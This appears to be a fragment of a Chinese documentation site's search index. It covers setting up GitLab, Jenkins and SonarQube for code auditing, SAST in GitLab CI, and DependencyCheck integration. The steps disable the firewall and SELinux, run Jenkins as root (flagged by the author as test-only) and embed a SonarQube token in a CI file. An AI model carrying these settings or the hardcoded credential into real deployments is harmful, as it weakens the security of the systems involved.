policycoreutils-python.x86_64 openssh-server.x86_64 -y # \u5b89\u88c5\u90ae\u4ef6\u670d\u52a1 yum install postfix.x86_64 -y # \u5173\u95ed\u9632\u706b\u5899 systemctl stop firewalld.service systemctl disable firewalld.service setenforce 0 # \u6dfb\u52a0\u793e\u533a\u7248package curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | bash # \u5b89\u88c5\u793e\u533a\u7248gitlab yum install gitlab-ce.x86_64 -y # \u6216\u8005\u4f7f\u7528\u56fd\u5185\u955c\u50cf\u5b89\u88c5 # \u914d\u7f6egitlab\u7ad9\u70b9url\uff0c\u6211\u8fd9\u91cc\u4f7f\u7528ip\u66ff\u4ee3 vim /etc/gitlab/gitlab.rb external_url http://10.10.10.5 # \u542f\u52a8gitlab gitlab-ctl reconfigure \u89e3\u51b3\u7aef\u53e3\u51b2\u7a81 \u7531\u4e8e\u6211\u5148\u914d\u7f6e\u4e86Jenkins\uff0c8080\u7aef\u53e3\u88ab\u5360\u7528\uff0c\u5982\u679c\u4f60\u76f4\u63a5\u8bbf\u95ee\uff0c\u4f1a\u51fa\u73b0 \u89e3\u51b3\u65b9\u6848\u662f\uff1a\u4fee\u6539unicorn\uff08\u5907\u6ce8\uff1a\u4e0d\u4e00\u5b9a\u90fd\u662f\u8fd9\u4e2a\u9519\u8bef\uff0c\u4e5f\u6709\u53ef\u80fd\u5185\u5b58\u4e0d\u591f\uff0c \u53c2\u8003\u70b9\u6211 \uff09 # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /etc/gitlab/gitlab.rb unicorn['listen'] = 'localhost' unicorn['port'] = 8082 # \u539f\u672c\u4e3a\uff1aunicorn['port'] = 8080 # \u4fee\u6539\u76d1\u542c\u6587\u4ef6 vim /var/opt/gitlab/gitlab-rails/etc/unicorn.rb listen 127.0.0.1:8082 , :tcp_nopush = true # \u539f\u672c\u4e3a\uff1alisten 127.0.0.1:8080 , :tcp_nopush = true # \u91cd\u542f\u670d\u52a1 gitlab-ctl restart \u865a\u62df\u673a\u914d\u7f6eGitlab-Runner # \u6dfb\u52a0package curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.rpm.sh | bash # \u5b89\u88c5 yum install gitlab-runner.x86_64 -y \u865a\u62df\u673a\u914d\u7f6eJenkins # \u4e0b\u8f7djenkins wget jenkins-2.174-1.1.noarch.rpm # \u5b89\u88c5 rpm -ivh jenkins-2.174-1.1.noarch.rpm # \u914d\u7f6e vim /etc/sysconfig/jenkins JENKINS_USER= root # \u8fd9\u4e48\u505a\u4ec5\u9650\u4e8e\u6d4b\u8bd5\u73af\u5883\uff0c\u4e3a\u4e86\u51fa\u73b0\u8c03\u8bd5\u5404\u79cd\u6743\u9650\u95ee\u9898\uff1b\u751f\u4ea7\u4e0d\u5141\u8bb8\u8fd9\u4e48\u505a # \u4fee\u6539\u76ee\u5f55\u6743\u9650 chown -R root:root /var/lib/jenkins chown -R root:root /var/cache/jenkins chown -R root:root /var/log/jenkins # \u542f\u52a8\u670d\u52a1 systemctl start jenkins.service # \u8bbf\u95ee8080\u7aef\u53e3 # \u5bc6\u7801\u6587\u4ef6 cat /var/lib/jenkins/secrets/initialAdminPassword # \u9009\u62e9\u9ed8\u8ba4\u7684\u63d2\u4ef6 \u865a\u62df\u673a\u914d\u7f6eSonarQube \u53ef\u53c2\u8003 \u5982\u679cjava\u73af\u5883\u662f\u914d\u7f6e\u5b89\u88c5\u7684\uff0c\u9700\u8981\u6307\u5b9ajava\u73af\u5883\uff1a vim sonarqube-7.7/conf/wrapper.conf # \u5b89\u88c5jvm\u73af\u5883 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u5b89\u88c5\u6570\u636e\u5e93 wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm rpm -ivh mysql57-community-release-el7-10.noarch.rpm yum install mysql-community-server.x86_64 -y # \u6dfb\u52a0\u7528\u6237 useradd sonarqube passwd sonarqube # \u4e0b\u8f7d\u6587\u4ef6 wget sonarqube-7.7.zip # \u4ee5\u4e0b\u5185\u5bb9\u7701\u7565 # \u914d\u7f6egitlab\u63d2\u4ef6 # \u914d\u7f6e--\u5e94\u7528\u5e02\u573a--Search\uff0c\u8f93\u5165gitlab\uff0c\u70b9\u51fb\u5b89\u88c5\u5e76\u8bb0\u5f97\u91cd\u542f \u5b9e\u73b0SAST \u4e3a\u4ec0\u4e48\u8981\u5728gitlab\u505a\u4ee3\u7801\u626b\u63cf\uff1a\u5de6\u79fb\u626b\u63cf\u7684\u597d\u5904\uff0c\u5c3d\u65e9\u7684\u53d1\u73b0\u4ee3\u7801\u5c42\u9762\u7684\u5b89\u5168\u6f0f\u6d1e\uff1b Gitlab + SonarQube\u5b9e\u73b0\u4ee3\u7801\u626b\u63cf \u89c1\u53c2\u8003\u8d44\u6599\u4e2d SonarQube \u4e4b gitlab-plugin \u914d\u5408 gitlab-ci \u5b8c\u6210\u6bcf\u6b21 commit \u4ee3\u7801\u68c0\u6d4b # Gitlab Ci\u914d\u7f6e\uff0cjava sast: stage: test script: - /home/gitlab-runner/sonar-scanner-3.3.0.1492-linux/bin/sonar-scanner -Dsonar.host.url=http://10.10.10.5:9000 -Dsonar.login=49a54ada3dcf791ad2f31408fef67cafa2a19b4e -Dsonar.issuesReport.console.enable=True -Dsonar.projectKey=$CI_PROJECT_NAME -Dsonar.java.binaries=/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el7_6.x86_64/jre/bin/ tags: - sec only: - master \u6548\u679c\u56fe \u5982\u679c\u4f60\u9700\u8981\u963b\u65ad\uff0c\u90a3\u4e48\u53ef\u4ee5\u8fdb\u884c\u8fd9\u4e48\u64cd\u4f5c\uff1a \u914d\u7f6esonar\u8d28\u91cf\u9608\uff1b gitlab ci \u5224\u65ad sonar\u7684\u6267\u884c\u72b6\u6001 if curl http://10.10.10.5:9000/api/qualitygates/project_status?projectKey=go-language: | grep 'ERROR'; then echo error exit 1; fi \u8fd9\u6761\u547d\u4ee4\u52a0\u5165\u5230gitlab ci pipelines\u4e2d\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u963b\u65ad\uff08\u4e0d\u5efa\u8bae\uff0csonar\u89c4\u5219\u9700\u8981\u4f18\u5316\u540e\u518d\u6162\u6162\u4e0a\u7ebf\u963b\u65ad\u529f\u80fd\uff09\u3002 \u8e29\u5751 \u8fde\u63a5\u963f\u91cc\u4e91RDS sonar.jdbc.url=jdbc:mysql://address:3306/sonar?useUnicode=true characterEncoding=utf8 \u53c2\u8003\u8d44\u6599 GitLab Installation SonarQube \u4e4b gitlab-plugin \u914d\u5408 gitlab-ci \u5b8c\u6210\u6bcf\u6b21 commit \u4ee3\u7801\u68c0\u6d4b CentOS 7 \u5b89\u88c5 Jenkins","title":"Gitlab+Jenkins+SonarQube \u5b9e\u73b0\u4ee3\u7801\u5ba1\u8ba1\u6307\u5357"},{"location":"other-security-branch/devsecops/gjs/#gitlabjenkinssonarqube","text":"\u73af\u5883\u8bf4\u660e \u865a\u62df\u7cfb\u7edf\uff1aCentos7 \u672c\u673a\u7cfb\u7edf\uff1aMac Gitlab\uff1a\u793e\u533a\u724811.10.0 Gitlab-Runner\uff1a11.10.0 SonarQube\uff1a\u793e\u533a\u72487.7 SonarScanner\uff1a3.3.0 Jenkins\uff1a2.174","title":"Gitlab+Jenkins+SonarQube \u5b9e\u73b0\u4ee3\u7801\u5ba1\u8ba1\u6307\u5357"},{"location":"other-security-branch/devsecops/gjs/#gitlab","text":"# \u89e3\u51b3\u4f9d\u8d56 yum install policycoreutils-python.x86_64 openssh-server.x86_64 -y # \u5b89\u88c5\u90ae\u4ef6\u670d\u52a1 yum install postfix.x86_64 -y # \u5173\u95ed\u9632\u706b\u5899 systemctl stop firewalld.service systemctl disable firewalld.service setenforce 0 # \u6dfb\u52a0\u793e\u533a\u7248package curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | bash # \u5b89\u88c5\u793e\u533a\u7248gitlab yum install gitlab-ce.x86_64 -y # \u6216\u8005\u4f7f\u7528\u56fd\u5185\u955c\u50cf\u5b89\u88c5 # \u914d\u7f6egitlab\u7ad9\u70b9url\uff0c\u6211\u8fd9\u91cc\u4f7f\u7528ip\u66ff\u4ee3 vim /etc/gitlab/gitlab.rb external_url http://10.10.10.5 # \u542f\u52a8gitlab gitlab-ctl reconfigure","title":"\u865a\u62df\u673a\u914d\u7f6eGitlab"},{"location":"other-security-branch/devsecops/gjs/#_1","text":"\u7531\u4e8e\u6211\u5148\u914d\u7f6e\u4e86Jenkins\uff0c8080\u7aef\u53e3\u88ab\u5360\u7528\uff0c\u5982\u679c\u4f60\u76f4\u63a5\u8bbf\u95ee\uff0c\u4f1a\u51fa\u73b0 \u89e3\u51b3\u65b9\u6848\u662f\uff1a\u4fee\u6539unicorn\uff08\u5907\u6ce8\uff1a\u4e0d\u4e00\u5b9a\u90fd\u662f\u8fd9\u4e2a\u9519\u8bef\uff0c\u4e5f\u6709\u53ef\u80fd\u5185\u5b58\u4e0d\u591f\uff0c \u53c2\u8003\u70b9\u6211 \uff09 # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /etc/gitlab/gitlab.rb unicorn['listen'] = 'localhost' unicorn['port'] = 8082 # \u539f\u672c\u4e3a\uff1aunicorn['port'] = 8080 # \u4fee\u6539\u76d1\u542c\u6587\u4ef6 vim /var/opt/gitlab/gitlab-rails/etc/unicorn.rb listen 127.0.0.1:8082 , :tcp_nopush = true # \u539f\u672c\u4e3a\uff1alisten 127.0.0.1:8080 , :tcp_nopush = true # \u91cd\u542f\u670d\u52a1 gitlab-ctl restart","title":"\u89e3\u51b3\u7aef\u53e3\u51b2\u7a81"},{"location":"other-security-branch/devsecops/gjs/#gitlab-runner","text":"# \u6dfb\u52a0package curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.rpm.sh | bash # \u5b89\u88c5 yum install gitlab-runner.x86_64 -y","title":"\u865a\u62df\u673a\u914d\u7f6eGitlab-Runner"},{"location":"other-security-branch/devsecops/gjs/#jenkins","text":"# \u4e0b\u8f7djenkins wget jenkins-2.174-1.1.noarch.rpm # \u5b89\u88c5 rpm -ivh jenkins-2.174-1.1.noarch.rpm # \u914d\u7f6e vim /etc/sysconfig/jenkins JENKINS_USER= root # \u8fd9\u4e48\u505a\u4ec5\u9650\u4e8e\u6d4b\u8bd5\u73af\u5883\uff0c\u4e3a\u4e86\u51fa\u73b0\u8c03\u8bd5\u5404\u79cd\u6743\u9650\u95ee\u9898\uff1b\u751f\u4ea7\u4e0d\u5141\u8bb8\u8fd9\u4e48\u505a # \u4fee\u6539\u76ee\u5f55\u6743\u9650 chown -R root:root /var/lib/jenkins chown -R root:root /var/cache/jenkins chown -R root:root /var/log/jenkins # \u542f\u52a8\u670d\u52a1 systemctl start jenkins.service # \u8bbf\u95ee8080\u7aef\u53e3 # \u5bc6\u7801\u6587\u4ef6 cat /var/lib/jenkins/secrets/initialAdminPassword # \u9009\u62e9\u9ed8\u8ba4\u7684\u63d2\u4ef6","title":"\u865a\u62df\u673a\u914d\u7f6eJenkins"},{"location":"other-security-branch/devsecops/gjs/#sonarqube","text":"\u53ef\u53c2\u8003 \u5982\u679cjava\u73af\u5883\u662f\u914d\u7f6e\u5b89\u88c5\u7684\uff0c\u9700\u8981\u6307\u5b9ajava\u73af\u5883\uff1a vim sonarqube-7.7/conf/wrapper.conf # \u5b89\u88c5jvm\u73af\u5883 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u5b89\u88c5\u6570\u636e\u5e93 wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm rpm -ivh mysql57-community-release-el7-10.noarch.rpm yum install mysql-community-server.x86_64 -y # \u6dfb\u52a0\u7528\u6237 useradd sonarqube passwd sonarqube # \u4e0b\u8f7d\u6587\u4ef6 wget sonarqube-7.7.zip # \u4ee5\u4e0b\u5185\u5bb9\u7701\u7565 # \u914d\u7f6egitlab\u63d2\u4ef6 # \u914d\u7f6e--\u5e94\u7528\u5e02\u573a--Search\uff0c\u8f93\u5165gitlab\uff0c\u70b9\u51fb\u5b89\u88c5\u5e76\u8bb0\u5f97\u91cd\u542f","title":"\u865a\u62df\u673a\u914d\u7f6eSonarQube"},{"location":"other-security-branch/devsecops/gjs/#sast","text":"\u4e3a\u4ec0\u4e48\u8981\u5728gitlab\u505a\u4ee3\u7801\u626b\u63cf\uff1a\u5de6\u79fb\u626b\u63cf\u7684\u597d\u5904\uff0c\u5c3d\u65e9\u7684\u53d1\u73b0\u4ee3\u7801\u5c42\u9762\u7684\u5b89\u5168\u6f0f\u6d1e\uff1b","title":"\u5b9e\u73b0SAST"},{"location":"other-security-branch/devsecops/gjs/#gitlab-sonarqube","text":"\u89c1\u53c2\u8003\u8d44\u6599\u4e2d SonarQube \u4e4b gitlab-plugin \u914d\u5408 gitlab-ci \u5b8c\u6210\u6bcf\u6b21 commit \u4ee3\u7801\u68c0\u6d4b # Gitlab Ci\u914d\u7f6e\uff0cjava sast: stage: test script: - /home/gitlab-runner/sonar-scanner-3.3.0.1492-linux/bin/sonar-scanner -Dsonar.host.url=http://10.10.10.5:9000 -Dsonar.login=49a54ada3dcf791ad2f31408fef67cafa2a19b4e -Dsonar.issuesReport.console.enable=True -Dsonar.projectKey=$CI_PROJECT_NAME -Dsonar.java.binaries=/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el7_6.x86_64/jre/bin/ tags: - sec only: - master \u6548\u679c\u56fe \u5982\u679c\u4f60\u9700\u8981\u963b\u65ad\uff0c\u90a3\u4e48\u53ef\u4ee5\u8fdb\u884c\u8fd9\u4e48\u64cd\u4f5c\uff1a \u914d\u7f6esonar\u8d28\u91cf\u9608\uff1b gitlab ci \u5224\u65ad sonar\u7684\u6267\u884c\u72b6\u6001 if curl http://10.10.10.5:9000/api/qualitygates/project_status?projectKey=go-language: | grep 'ERROR'; then echo error exit 1; fi \u8fd9\u6761\u547d\u4ee4\u52a0\u5165\u5230gitlab ci pipelines\u4e2d\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u963b\u65ad\uff08\u4e0d\u5efa\u8bae\uff0csonar\u89c4\u5219\u9700\u8981\u4f18\u5316\u540e\u518d\u6162\u6162\u4e0a\u7ebf\u963b\u65ad\u529f\u80fd\uff09\u3002","title":"Gitlab + SonarQube\u5b9e\u73b0\u4ee3\u7801\u626b\u63cf"},{"location":"other-security-branch/devsecops/gjs/#_2","text":"\u8fde\u63a5\u963f\u91cc\u4e91RDS sonar.jdbc.url=jdbc:mysql://address:3306/sonar?useUnicode=true characterEncoding=utf8","title":"\u8e29\u5751"},{"location":"other-security-branch/devsecops/gjs/#_3","text":"GitLab Installation SonarQube \u4e4b gitlab-plugin \u914d\u5408 gitlab-ci \u5b8c\u6210\u6bcf\u6b21 commit \u4ee3\u7801\u68c0\u6d4b CentOS 7 \u5b89\u88c5 Jenkins","title":"\u53c2\u8003\u8d44\u6599"},{"location":"other-security-branch/devsecops/sdc/","text":"SonarQube\u96c6\u6210DependencyCheck \u73af\u5883\u6982\u8ff0\uff1a SonarQube\uff1a7.7 SonarScanner\uff1a3.10.0 \u5b89\u88c5\u63d2\u4ef6 SonarQube Dependency-Check\u63d2\u4ef6\u9879\u76ee\u5730\u5740 \u4e0b\u8f7d\u8981\u6ce8\u610f\u7248\u672c\uff0c\u76ee\u524dGithub\u4e0a\u652f\u63016.x\u7248\u672c\u4e0e7.x\uff0c\u7248\u672c\u6211\u8fd9\u91cc\u4e0b\u8f7d\u7684\u662f\uff1a sonar-dependency-check-plugin-1.2.3.jar \u4e0b\u8f7d\u597d\u540e\u653e\u7f6e\u5728SonarQube\u7684\u63d2\u4ef6\u76ee\u5f55\uff0c\u518d\u91cd\u542f\u5373\u53ef\u3002 \u7f51\u4e0a\u6709\u51e0\u7bc7\u6587\u7ae0\u90fd\u63d0\u5230\u4e86\u8fd9\u91cc\u9700\u8981\u914d\u7f6ePaths\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u53ef\u4ee5\u4e0d\u7528\u914d\u7f6e\uff0c\u6211\u4eec\u4f7f\u7528SonarScanner\u7ed9SonarQube\u4f20\u8f93\u5373\u53ef\u3002\uff08\u53c2\u8003\u8d44\u6599\u89c1\u6587\u672b\uff09 \u6267\u884c\u626b\u63cf\uff1a\u89e3\u51b3SonarQube\u627e\u4e0d\u5230\u62a5\u544a INFO: Dependency-Check HTML report does not exists \u8fd9\u4e2a\u5751\u771f\u7684\u662f\u8e29\u4e86\u5f88\u4e45\uff0c\u540e\u6765\u4e5f\u4e0eGitHub\u4f5c\u8005\u8fdb\u884c\u4e86 \u6c9f\u901a \uff0c\u5bf9\u65b9\u63d0\u9192\u6211\u9700\u8981\u5148\u751f\u6210\u62a5\u544a\u3002 \u751f\u6210\u62a5\u544a\u5de5\u5177\uff1a DependencyCheck # \u4e0b\u8f7d\u5de5\u5177 bash bin/dependency-check.sh -h # \u6d4b\u8bd5\uff0c\u6211\u8fd9\u91cc\u662f\u7ed3\u5408SonarScanner + Gitlab-CI\u8fdb\u884c\u5206\u6790 # \u914d\u7f6eGitlab-CI\u6587\u4ef6 stages: - sast sast: stage: sast script: - mvn package -DskipTests # \u7f16\u8bd1\u9879\u76ee - mkdir $PWD/reports # \u521b\u5efa\u62a5\u544a\u76ee\u5f55 - /home/gitlab-runner/dependency-check/bin/dependency-check.sh -s $PWD/ -f XML -o $PWD/reports/dependency-check-report.xml # \u751f\u6210\u62a5\u544a - /home/gitlab-runner/dependency-check/bin/dependency-check.sh -s $PWD/ -f HTML -o $PWD/reports/dependency-check-report.html # \u751f\u6210\u62a5\u544a - sonar-scanner -Dsonar.host.url=http://10.10.10.12:9000 -Dsonar.login=token -Dsonar.projectKey=$CI_PROJECT_NAME:$CI_COMMIT_REF_NAME -Dsonar.java.binaries=$PWD -Dsonar.dependencyCheck.reportPath=$PWD/reports/dependency-check-report.xml -Dsonar.dependencyCheck.htmlReportPath=$PWD/reports/dependency-check-report.html # \u6267\u884cSonarScanner\u626b\u63cf\uff0c\u5e76\u5c06DependencyCheck\u7684\u7ed3\u679c\u4f20\u8f93\u7ed9SonarQube tags: - sec1 SonarQube \u7ed3\u679c\uff1a \u601d\u8003 \u5728\u4ec0\u4e48\u73af\u8282\u6267\u884c\u7b2c\u4e09\u65b9\u4f9d\u8d56\u626b\u63cf \u7531\u4e8e\u626b\u63cf\u7b2c\u4e09\u65b9\u4f9d\u8d56\u7684\u5de5\u5177\u662f\u626b\u63cfjar\u5305\uff0c\u6240\u4ee5\u9700\u8981\u5728\u9879\u76ee\u7f16\u8bd1\u4e4b\u540e\u624d\u80fd\u8fdb\u884c\u626b\u63cf\uff0c\u5426\u5219\u4f1a\u6ca1\u6709\u6548\u679c\u3002\u6d4b\u8bd5\u65b9\u6cd5\u5982\u4e0b\uff1a # \u5728Gitlab-CI\u4e2d\u53bb\u6389\u7f16\u8bd1\u9879\u76ee\u8fd9\u4e00\u6b65 # \u626b\u63cf\u7ed3\u679c\u5982\u56fe \u6240\u4ee5\u5982\u679c\u5728\u4ee3\u7801\u63d0\u4ea4\u9636\u6bb5\uff08\u672c\u6587\u4e2d\u7684\u5f62\u5f0f\uff09\u5c06\u4f1a\u5f62\u6210\u8d44\u6e90\u91cd\u590d\u4f7f\u7528\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u9879\u76ee\u5728\u53d1\u7248\u7684\u65f6\u5019\u4e5f\u4f1a\u7f16\u8bd1\uff0c\u5c31\u5f62\u6210\u4e86\u91cd\u590d\u7f16\u8bd1\u3002\u6240\u4ee5\u5efa\u8bae\u64cd\u4f5c\u662f\u653e\u5728Jenkins\u6253\u5305\u7684\u65f6\u5019\u89e6\u53d1pipelines\u52a8\u4f5c\u3002\u8fd9\u4e2a\u65f6\u5019\u4ee3\u7801\u6253\u5305\u4e00\u822c\u90fd\u662f\u53d1\u5e03\u5230\u6d4b\u8bd5\u73af\u5883\uff08QA\uff09\u6211\u4eec\u53d1\u73b0\u5b89\u5168\u95ee\u9898\uff0c\u53ef\u4ee5\u5b89\u6392\u8fdb\u884c\u4fee\u590d\u3002 \u626b\u63cf\u53d1\u73b0\u7684\u6f0f\u6d1e\u5982\u4f55\u5f62\u6210\u95ed\u73af \u4f9d\u8d56\u5305\u53ef\u80fd\u4f1a\u626b\u63cf\u51fa\u5f88\u591a\u6f0f\u6d1e\uff0c\u5982\u4f55\u5bf9\u8fd9\u4e9b\u6f0f\u6d1e\u5f62\u6210\u95ed\u73af\uff0c\u8981\u601d\u8003\u51e0\u4e2a\u65b9\u9762\u7684\u95ee\u9898\uff1a \u6f0f\u6d1e\u662f\u5426\u90fd\u9700\u8981\u4fee\u590d\uff1f\uff1a \u4e25\u91cd\u3001\u9ad8\u5371\u9700\u8981\u4fee\u590d\u3002\u6f0f\u6d1e\u7684\u4fee\u590d\u6210\u672c \u9700\u8981\u4fee\u590d\u7684\u6f0f\u6d1e\u5982\u4f55\u5f62\u6210\u81ea\u52a8\u5316\u7684\u8ddf\u8e2a\u6d41\u7a0b\uff1f\uff1a \u624b\u52a8\u63d0\u4ea4\u5230\u6f0f\u6d1e\u7ba1\u7406\u5e73\u53f0\uff0c\u6216\u8005\u4f7f\u7528SonarQube API\u5199\u811a\u672c\u81ea\u52a8\u63d0\u4ea4\u3002\u5173\u4e8e \u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7ba1\u7406 \u6f0f\u6d1e\u7684\u51c6\u786e\u6027 \u626b\u63cf\u51fa\u6765\u7684\u6f0f\u6d1e\u53ef\u80fd\u5b58\u5728\u5f88\u591a\u8bef\u62a5\uff0c\u6216\u8005\u6f0f\u6d1e\u5e76\u4e0d\u80fd\u5229\u7528\u6210\u529f\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u518d\u53bb\u624b\u5de5\u9a8c\u8bc1\u6f0f\u6d1e\u8017\u65f6\u3002\u6240\u4ee5\u601d\u8003\u5982\u4f55\u6765\u89e3\u51b3\u6f0f\u6d1e\u51c6\u786e\u6027\u5c31\u6210\u4e86\u4e0b\u4e00\u4e2a\u8981\u89e3\u51b3\u7684\u95ee\u9898\u3002 \u53c2\u8003\u8d44\u6599 linuxea:gitlab-ci/cd Dependency\u4f9d\u8d56\u626b\u63cf\u4e24\u79cd\u65b9\u5f0f (\u4e94)","title":"SonarQube\u96c6\u6210DependencyCheck"},{"location":"other-security-branch/devsecops/sdc/#sonarqubedependencycheck","text":"\u73af\u5883\u6982\u8ff0\uff1a SonarQube\uff1a7.7 SonarScanner\uff1a3.10.0","title":"SonarQube\u96c6\u6210DependencyCheck"},{"location":"other-security-branch/devsecops/sdc/#_1","text":"SonarQube Dependency-Check\u63d2\u4ef6\u9879\u76ee\u5730\u5740 \u4e0b\u8f7d\u8981\u6ce8\u610f\u7248\u672c\uff0c\u76ee\u524dGithub\u4e0a\u652f\u63016.x\u7248\u672c\u4e0e7.x\uff0c\u7248\u672c\u6211\u8fd9\u91cc\u4e0b\u8f7d\u7684\u662f\uff1a sonar-dependency-check-plugin-1.2.3.jar \u4e0b\u8f7d\u597d\u540e\u653e\u7f6e\u5728SonarQube\u7684\u63d2\u4ef6\u76ee\u5f55\uff0c\u518d\u91cd\u542f\u5373\u53ef\u3002 \u7f51\u4e0a\u6709\u51e0\u7bc7\u6587\u7ae0\u90fd\u63d0\u5230\u4e86\u8fd9\u91cc\u9700\u8981\u914d\u7f6ePaths\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u53ef\u4ee5\u4e0d\u7528\u914d\u7f6e\uff0c\u6211\u4eec\u4f7f\u7528SonarScanner\u7ed9SonarQube\u4f20\u8f93\u5373\u53ef\u3002\uff08\u53c2\u8003\u8d44\u6599\u89c1\u6587\u672b\uff09","title":"\u5b89\u88c5\u63d2\u4ef6"},{"location":"other-security-branch/devsecops/sdc/#sonarqube","text":"INFO: Dependency-Check HTML report does not exists \u8fd9\u4e2a\u5751\u771f\u7684\u662f\u8e29\u4e86\u5f88\u4e45\uff0c\u540e\u6765\u4e5f\u4e0eGitHub\u4f5c\u8005\u8fdb\u884c\u4e86 \u6c9f\u901a \uff0c\u5bf9\u65b9\u63d0\u9192\u6211\u9700\u8981\u5148\u751f\u6210\u62a5\u544a\u3002 \u751f\u6210\u62a5\u544a\u5de5\u5177\uff1a DependencyCheck # \u4e0b\u8f7d\u5de5\u5177 bash bin/dependency-check.sh -h # \u6d4b\u8bd5\uff0c\u6211\u8fd9\u91cc\u662f\u7ed3\u5408SonarScanner + Gitlab-CI\u8fdb\u884c\u5206\u6790 # \u914d\u7f6eGitlab-CI\u6587\u4ef6 stages: - sast sast: stage: sast script: - mvn package -DskipTests # \u7f16\u8bd1\u9879\u76ee - mkdir $PWD/reports # \u521b\u5efa\u62a5\u544a\u76ee\u5f55 - /home/gitlab-runner/dependency-check/bin/dependency-check.sh -s $PWD/ -f XML -o $PWD/reports/dependency-check-report.xml # \u751f\u6210\u62a5\u544a - /home/gitlab-runner/dependency-check/bin/dependency-check.sh -s $PWD/ -f HTML -o $PWD/reports/dependency-check-report.html # \u751f\u6210\u62a5\u544a - sonar-scanner -Dsonar.host.url=http://10.10.10.12:9000 -Dsonar.login=token -Dsonar.projectKey=$CI_PROJECT_NAME:$CI_COMMIT_REF_NAME -Dsonar.java.binaries=$PWD -Dsonar.dependencyCheck.reportPath=$PWD/reports/dependency-check-report.xml -Dsonar.dependencyCheck.htmlReportPath=$PWD/reports/dependency-check-report.html # \u6267\u884cSonarScanner\u626b\u63cf\uff0c\u5e76\u5c06DependencyCheck\u7684\u7ed3\u679c\u4f20\u8f93\u7ed9SonarQube tags: - sec1 SonarQube \u7ed3\u679c\uff1a","title":"\u6267\u884c\u626b\u63cf\uff1a\u89e3\u51b3SonarQube\u627e\u4e0d\u5230\u62a5\u544a"},{"location":"other-security-branch/devsecops/sdc/#_2","text":"","title":"\u601d\u8003"},{"location":"other-security-branch/devsecops/sdc/#_3","text":"\u7531\u4e8e\u626b\u63cf\u7b2c\u4e09\u65b9\u4f9d\u8d56\u7684\u5de5\u5177\u662f\u626b\u63cfjar\u5305\uff0c\u6240\u4ee5\u9700\u8981\u5728\u9879\u76ee\u7f16\u8bd1\u4e4b\u540e\u624d\u80fd\u8fdb\u884c\u626b\u63cf\uff0c\u5426\u5219\u4f1a\u6ca1\u6709\u6548\u679c\u3002\u6d4b\u8bd5\u65b9\u6cd5\u5982\u4e0b\uff1a # \u5728Gitlab-CI\u4e2d\u53bb\u6389\u7f16\u8bd1\u9879\u76ee\u8fd9\u4e00\u6b65 # \u626b\u63cf\u7ed3\u679c\u5982\u56fe \u6240\u4ee5\u5982\u679c\u5728\u4ee3\u7801\u63d0\u4ea4\u9636\u6bb5\uff08\u672c\u6587\u4e2d\u7684\u5f62\u5f0f\uff09\u5c06\u4f1a\u5f62\u6210\u8d44\u6e90\u91cd\u590d\u4f7f\u7528\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u9879\u76ee\u5728\u53d1\u7248\u7684\u65f6\u5019\u4e5f\u4f1a\u7f16\u8bd1\uff0c\u5c31\u5f62\u6210\u4e86\u91cd\u590d\u7f16\u8bd1\u3002\u6240\u4ee5\u5efa\u8bae\u64cd\u4f5c\u662f\u653e\u5728Jenkins\u6253\u5305\u7684\u65f6\u5019\u89e6\u53d1pipelines\u52a8\u4f5c\u3002\u8fd9\u4e2a\u65f6\u5019\u4ee3\u7801\u6253\u5305\u4e00\u822c\u90fd\u662f\u53d1\u5e03\u5230\u6d4b\u8bd5\u73af\u5883\uff08QA\uff09\u6211\u4eec\u53d1\u73b0\u5b89\u5168\u95ee\u9898\uff0c\u53ef\u4ee5\u5b89\u6392\u8fdb\u884c\u4fee\u590d\u3002","title":"\u5728\u4ec0\u4e48\u73af\u8282\u6267\u884c\u7b2c\u4e09\u65b9\u4f9d\u8d56\u626b\u63cf"},{"location":"other-security-branch/devsecops/sdc/#_4","text":"\u4f9d\u8d56\u5305\u53ef\u80fd\u4f1a\u626b\u63cf\u51fa\u5f88\u591a\u6f0f\u6d1e\uff0c\u5982\u4f55\u5bf9\u8fd9\u4e9b\u6f0f\u6d1e\u5f62\u6210\u95ed\u73af\uff0c\u8981\u601d\u8003\u51e0\u4e2a\u65b9\u9762\u7684\u95ee\u9898\uff1a \u6f0f\u6d1e\u662f\u5426\u90fd\u9700\u8981\u4fee\u590d\uff1f\uff1a \u4e25\u91cd\u3001\u9ad8\u5371\u9700\u8981\u4fee\u590d\u3002\u6f0f\u6d1e\u7684\u4fee\u590d\u6210\u672c \u9700\u8981\u4fee\u590d\u7684\u6f0f\u6d1e\u5982\u4f55\u5f62\u6210\u81ea\u52a8\u5316\u7684\u8ddf\u8e2a\u6d41\u7a0b\uff1f\uff1a \u624b\u52a8\u63d0\u4ea4\u5230\u6f0f\u6d1e\u7ba1\u7406\u5e73\u53f0\uff0c\u6216\u8005\u4f7f\u7528SonarQube API\u5199\u811a\u672c\u81ea\u52a8\u63d0\u4ea4\u3002\u5173\u4e8e 